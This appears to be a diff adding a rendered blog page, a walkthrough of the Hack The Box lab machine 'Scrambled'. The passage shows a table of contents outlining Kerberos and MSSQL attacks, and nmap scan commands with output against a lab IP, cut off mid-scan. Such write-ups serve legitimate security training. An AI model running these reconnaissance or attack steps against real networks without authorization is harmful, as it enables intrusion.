@@ -1,0 +1,2708 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.135.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Saucy Monk" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Scrambled HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.e6eadce601966e1bc2d798a6a4b94edc31360559ec0c7efd94e31d855914e918a88c9bddfabc11200357a22ce33ebdfd27c70fdd76cc8d155e9633bab42e0f76.css"
+                integrity="sha512-5urc5gGWbhvC15impLlO3DE2BVnsDH79lOMdhVkU6RiojJvd&#43;rwRIANXoizjPr39J8cP3XbMjRVeljO6tC4Pdg==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Scrambled HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Box Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/scrambled-box/" title="./scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Scrambled HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.09.10"
+                            >2024.09.10
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        27 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            Kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/mssql/"
+                            class="tag-btn">
+                            MSSQL
+                        </a>
+                    
+                        <a
+                            href="/tags/.net/"
+                            class="tag-btn">
+                            .NET
+                        </a>
+                    
+                        <a
+                            href="/tags/deserialization/"
+                            class="tag-btn">
+                            Deserialization
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/scrambled-box/" class="bread-btn">
+    
+
+    
+        
+            Scrambled HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scrambled-hack-the-box-walkthrough-writeup">Scrambled Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#http-80">HTTP <code>80</code>:</a></li>
+        <li><a href="#mssql-1433">MSSQL <code>1433</code>:</a></li>
+        <li><a href="#scramblecorp-order-service-4411">ScrambleCorp Order Service <code>4411</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-authenticated-enumeration">2. Authenticated Enumeration:</a>
+      <ul>
+        <li><a href="#realizing-the-mistake-i-made-when-enumerating">Realizing the mistake I made when enumerating:</a></li>
+        <li><a href="#connecting-to-the-smb-shares-as-ksimpson">Connecting to the <code>SMB</code> shares as <code>ksimpson</code>:</a></li>
+        <li><a href="#finding-a-file-called-network-security-changes-dot-pdf">Finding a file called <code>Network Security Changes.pdf</code>:</a></li>
+        <li><a href="#trying-to-connect-to-mssql-using-impacket-mssql">Trying to Connect to <code>MSSQL</code> using <code>impacket-mssql</code>:</a></li>
+        <li><a href="#kerberoasting-using-kerberos-credentials-to-get-more-kerberos-credentials">Kerberoasting using Kerberos Credentials to Get More Kerberos Credentials:</a></li>
+        <li><a href="#cracking-the-sqlsvc-hashes-with-hashcat">Cracking the <code>sqlsvc</code> hashes with <code>hashcat</code>:</a></li>
+        <li><a href="#trying-to-connect-to-the-mssql-service">Trying to connect to the <code>MSSQL</code> Service:</a></li>
+        <li><a href="#i-ve-got-a-silverticket-maybe-and-x2026">I&rsquo;ve got a <code>SilverTicket</code> maybe…</a></li>
+        <li><a href="#creating-the-silver-ticket-with-impacket-ticketer">Creating the silver ticket with <code>impacket-ticketer</code>:</a></li>
+        <li><a href="#using-the-silver-ticket-to-access-the-sql-instance">Using the silver ticket to access the <code>SQL</code> instance:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-foothold">3. Foothold:</a>
+      <ul>
+        <li><a href="#activating-xp-cmdshell-on-the-host-to-enumerate-the-underlying-host-system">Activating <code>xp_cmdshell</code> on the host to enumerate the underlying host system:</a></li>
+        <li><a href="#getting-a-reverse-shell-as-sqlsvc">Getting a reverse shell as <code>sqlsvc</code>:</a></li>
+        <li><a href="#enumerating-the-database-and-finding-creds-for-miscsvc">Enumerating the Database &amp; Finding Creds for <code>MiscSvc</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-lateral-movement">4. Lateral Movement:</a>
+      <ul>
+        <li><a href="#getting-a-shell-as-miscsvc">Getting a shell as <code>MiscSvc</code>:</a></li>
+        <li><a href="#enumerating-smb-shares-as-miscsvc">Enumerating SMB shares as <code>miscsvc</code></a></li>
+        <li><a href="#using-the-scrambledclient-dot-exe">Using the <code>ScrambledClient.exe</code>:</a></li>
+        <li><a href="#finding-a-login-bypass-by-examining-the-scramblelib-dot-dll-in-dnspy">Finding a login bypass by Examining the <code>ScrambleLib.dll</code> in <code>DNSpy</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-dot-privilege-escalation">5. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#logging-into-scrambledclient-dot-exe-using-scrmdev-creds">Logging into <code>ScrambledClient.exe</code> using <code>scrmdev</code> creds:</a></li>
+        <li><a href="#examining-how-serialized-data-is-sent-via-scrambledclient-dot-exe">Examining how serialized data is sent via <code>ScrambledClient.exe</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-dot-ownership">6. Ownership:</a>
+      <ul>
+        <li><a href="#crafting-a-payload-with-yoserial-dot-net-and-catching-a-system-shell">Crafting a Payload with <code>yoserial.net</code> &amp; catching a system shell:</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-dot-persistence">7. Persistence:</a>
+      <ul>
+        <li><a href="#creating-a-golden-ticket-with-mimikatz">Creating A Golden Ticket with <code>mimikatz</code>:</a></li>
+        <li><a href="#transferring-the-golden-ticket-using-my-custom-python-webserver">Transferring the Golden Ticket Using my custom python webserver:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="scrambled-hack-the-box-walkthrough-writeup">Scrambled Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Scrambled">https://app.hackthebox.com/machines/Scrambled</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; wordlists:</h2>
+<ul>
+<li><strong>Variables</strong>:
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Wordlists</strong>:
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="nmap">NMAP:</h3>
+<ul>
+<li>
+<p><strong>Basic Scan</strong>:</p>
+<ul>
+<li><code>nmap $box -Pn -oA basicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20kali%20in%2046.02-HTB/BlogEntriesMade/Scrambled/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2008:18:34%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-06%2008:18%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.174.234%0a%20%20Host%20is%20up%20%280.039s%20latency%29.%0a%20%20Not%20shown:%20987%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%0a%20%2053/tcp%20%20%20open%20%20domain%0a%20%2080/tcp%20%20%20open%20%20http%0a%20%2088/tcp%20%20%20open%20%20kerberos-sec%0a%20%20135/tcp%20%20open%20%20msrpc%0a%20%20139/tcp%20%20open%20%20netbios-ssn%0a%20%20389/tcp%20%20open%20%20ldap%0a%20%20445/tcp%20%20open%20%20microsoft-ds%0a%20%20464/tcp%20%20open%20%20kpasswd5%0a%20%20593/tcp%20%20open%20%20http-rpc-epmap%0a%20%20636/tcp%20%20open%20%20ldapssl%0a%20%201433/tcp%20open%20%20ms-sql-s%0a%20%203268/tcp%20open%20%20globalcatLDAP%0a%20%203269/tcp%20open%20%20globalcatLDAPssl%0a%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2019.92%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>  🕙 08:18:34 zsh ❯ nmap $box -Pn -oA basicScan
+</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-06 08:18 BST
+</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.174.234
+</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>  53/tcp   open  domain
+</span></span><span style="display:flex;"><span>  80/tcp   open  http
+</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>  1433/tcp open  ms-sql-s
+</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 19.92 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>Some great targets here:
+<ul>
+<li>webserver</li>
+<li>dns</li>
+<li>smb</li>
+<li>ldap</li>
+<li>mssql</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>In depth scan</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%2046.02-HTB/BlogEntriesMade/Scrambled/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2011s%0a%f0%9f%95%99%2014:38:27%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-06%2014:38%20BST%0aStats:%200:01:18%20elapsed;%200%20hosts%20completed%20%281%20up%29,%201%20undergoing%20SYN%20Stealth%20Scan%0aSYN%20Stealth%20Scan%20Timing:%20About%2048.86%25%20done;%20ETC:%2014:41%20%280:01:14%20remaining%29%0aNmap%20scan%20report%20for%2010.129.115.202%0aHost%20is%20up%20%280.038s%20latency%29.%0aNot%20shown:%2065513%20filtered%20tcp%20ports%20%28no-response%29%0aBug%20in%20ms-sql-ntlm-info:%20no%20string%20output.%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a80/tcp%20%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20IIS%20httpd%2010.0%0a%7c_http-title:%20Scramble%20Corp%20Intranet%0a%7c_http-server-header:%20Microsoft-IIS/10.0%0a%7c%20http-methods:%0a%7c_%20%20Potentially%20risky%20methods:%20TRACE%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-06%2013:41:06Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20scrm.local0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202024-10-06T13:44:16&#43;00:00;%200s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC1.scrm.local%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC1.scrm.local%0a%7c%20Not%20valid%20before:%202022-06-09T01:42:36%0a%7c_Not%20valid%20after:%20%202023-06-09T01:42:36%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20scrm.local0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%20commonName=DC1.scrm.local%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC1.scrm.local%0a%7c%20Not%20valid%20before:%202022-06-09T01:42:36%0a%7c_Not%20valid%20after:%20%202023-06-09T01:42:36%0a%7c_ssl-date:%202024-10-06T13:44:16&#43;00:00;%200s%20from%20scanner%20time.%0a1433/tcp%20%20open%20%20ms-sql-s%20%20%20%20%20%20Microsoft%20SQL%20Server%202019%2015.00.2000.00;%20RTM%0a%7c%20ms-sql-info:%0a%7c%20%20%2010.129.115.202:1433:%0a%7c%20%20%20%20%20Version:%0a%7c%20%20%20%20%20%20%20name:%20Microsoft%20SQL%20Server%202019%20RTM%0a%7c%20%20%20%20%20%20%20number:%2015.00.2000.00%0a%7c%20%20%20%20%20%20%20Product:%20Microsoft%20SQL%20Server%202019%0a%7c%20%20%20%20%20%20%20Service%20pack%20level:%20RTM%0a%7c%20%20%20%20%20%20%20Post-SP%20patches%20applied:%20false%0a%7c_%20%20%20%20TCP%20port:%201433%0a%7c_ssl-date:%202024-10-06T13:44:16&#43;00:00;%200s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=SSL_Self_Signed_Fallback%0a%7c%20Not%20valid%20before:%202024-10-06T07:30:55%0a%7c_Not%20valid%20after:%20%202054-10-06T07:30:55%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20scrm.local0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%20commonName=DC1.scrm.local%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC1.scrm.local%0a%7c%20Not%20valid%20before:%202022-06-09T01:42:36%0a%7c_Not%20valid%20after:%20%202023-06-09T01:42:36%0a%7c_ssl-date:%202024-10-06T13:44:16&#43;00:00;%200s%20from%20scanner%20time.%0a3269/tcp%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20scrm.local0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202024-10-06T13:44:16&#43;00:00;%200s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC1.scrm.local%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC1.scrm.local%0a%7c%20Not%20valid%20before:%202022-06-09T01:42:36%0a%7c_Not%20valid%20after:%20%202023-06-09T01:42:36%0a4411/tcp%20%20open%20%20found?%0a%7c%20fingerprint-strings:%0a%7c%20%20%20DNSStatusRequestTCP,%20DNSVersionBindReqTCP,%20GenericLines,%20JavaRMI,%20Kerberos,%20LANDesk-RC,%20LDAPBindReq,%20LDAPSearchReq,%20NCP,%20NULL,%20NotesRPC,%20RPCCheck,%20SMBProgNeg,%20SSLSessionReq,%20TLSSessionReq,%20TerminalServer,%20TerminalServerCookie,%20WMSRequest,%20X11Probe,%20afp,%20giop,%20ms-sql-s,%20oracle-tns:%0a%7c%20%20%20%20%20SCRAMBLECORP_ORDERS_V1.0.3;%0a%7c%20%20%20FourOhFourRequest,%20GetRequest,%20HTTPOptions,%20Help,%20LPDString,%20RTSPRequest,%20SIPOptions:%0a%7c%20%20%20%20%20SCRAMBLECORP_ORDERS_V1.0.3;%0a%7c_%20%20%20%20ERROR_UNKNOWN_COMMAND;%0a5985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%7c_http-title:%20Not%20Found%0a9389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a49667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49673/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a49674/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a49698/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a52608/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a57490/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a1%20service%20unrecognized%20despite%20returning%20data.%20If%20you%20know%20the%20service/version,%20please%20submit%20the%20following%20fingerprint%20at%20https://nmap.org/cgi-bin/submit.cgi?new-service%20:%0aSF-Port4411-TCP:V=7.94SVN%25I=7%25D=10/6%25Time=67029371%25P=x86_64-pc-linux-gnu%25r%0aSF:%28NULL,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28GenericLines,1D,%22SCRAMB%0aSF:LECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28GetRequest,35,%22SCRAMBLECORP_ORDERS_V1%5c.%0aSF:0%5c.3;%5cr%5cnERROR_UNKNOWN_COMMAND;%5cr%5cn%22%29%25r%28HTTPOptions,35,%22SCRAMBLECORP_OR%0aSF:DERS_V1%5c.0%5c.3;%5cr%5cnERROR_UNKNOWN_COMMAND;%5cr%5cn%22%29%25r%28RTSPRequest,35,%22SCRAMB%0aSF:LECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cnERROR_UNKNOWN_COMMAND;%5cr%5cn%22%29%25r%28RPCCheck,1D,%22%0aSF:SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28DNSVersionBindReqTCP,1D,%22SCRAMBLE%0aSF:CORP_ORDERS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28DNSStatusRequestTCP,1D,%22SCRAMBLECORP_ORDE%0aSF:RS_V1%5c.0%5c.3;%5cr%5cn%22%29%25r%28Help,35,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5cr%5cnERROR_UN%0aSF:KNOWN_COMMAND;%5cr%5cn%22%29%25r%28SSLSessionReq,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;%5c%0aSF:r%5cn%22%29%25r%28TerminalServerCookie,1D,%22SCRAMBLECORP_ORDERS_V1%5c.0%5c.3;